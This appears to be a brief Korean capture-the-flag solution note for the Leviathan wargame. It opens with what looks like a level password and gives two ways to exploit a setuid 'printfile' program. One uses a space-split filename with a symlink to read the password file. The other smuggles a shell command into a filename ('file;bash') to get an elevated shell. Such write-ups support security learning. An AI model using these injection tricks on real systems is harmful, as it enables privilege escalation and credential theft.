f0n8h2iWLP

1. 1. touch "te st" -> ln -s [password] te로 비밀번호 파일에 링크 -> ~/printfile "te st" 결과 -> access 함수는 통과, cat에서 te와 st 실행(setuid) -> 비밀번호 출력
2. 2. touch "file;bash" -> ~/printfile "file;bash" 결과 -> access 함수는 통과, cat에서 file까지 읽고, bash를 실행 -> leviathan3 쉘 획득
